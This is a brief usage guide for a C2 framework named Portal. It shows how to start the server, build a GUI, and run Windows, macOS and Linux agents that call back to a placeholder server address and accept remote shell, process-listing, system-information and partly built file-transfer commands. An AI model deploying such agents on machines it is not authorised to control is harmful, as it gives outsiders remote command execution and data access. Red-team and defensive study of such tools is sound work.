# Portal C2 Framework Usage Guide

## Server
To start the C2 server:
```
./server/server -addr 0.0.0.0:50051
```

## GUI
The Wails GUI application can be built using:
```
just build-ui
```

## Agents
To run an agent, use the appropriate binary for your target OS and architecture:

### Windows
```
agents\agent-windows-amd64.exe -server your-server-ip:50051
```

### macOS
```
chmod +x agents/agent-macos-amd64
./agents/agent-macos-amd64 -server your-server-ip:50051
```

### Linux
```
chmod +x agents/agent-linux-amd64
./agents/agent-linux-amd64 -server your-server-ip:50051
```

## Commands
The following command types are supported:
- shell: Execute shell commands
- system: Get system information
- process: List running processes
- screenshot: Take a screenshot (not fully implemented)
- upload/download: File transfer (not fully implemented)
